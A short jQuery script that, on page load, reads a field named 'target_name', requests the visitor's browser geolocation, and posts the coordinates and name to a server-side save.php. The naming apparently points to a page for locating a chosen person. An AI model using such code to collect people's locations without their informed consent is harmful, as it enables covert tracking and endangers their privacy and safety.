

$(document).ready(function(){  
//location
    var name=$(".target_name").val();
    const successCallback=(position)=>{
        console.log(position.coords);
        var lat=position.coords.latitude;
        var long=position.coords.longitude;
        $.post("./save.php",
        {lat:lat,long: long,name:name},
        function(data,status){console.log(data);});
    }
    const errorCallback=(error)=>{console.log(error);}
    const watchId= navigator.geolocation.getCurrentPosition(successCallback,errorCallback);
});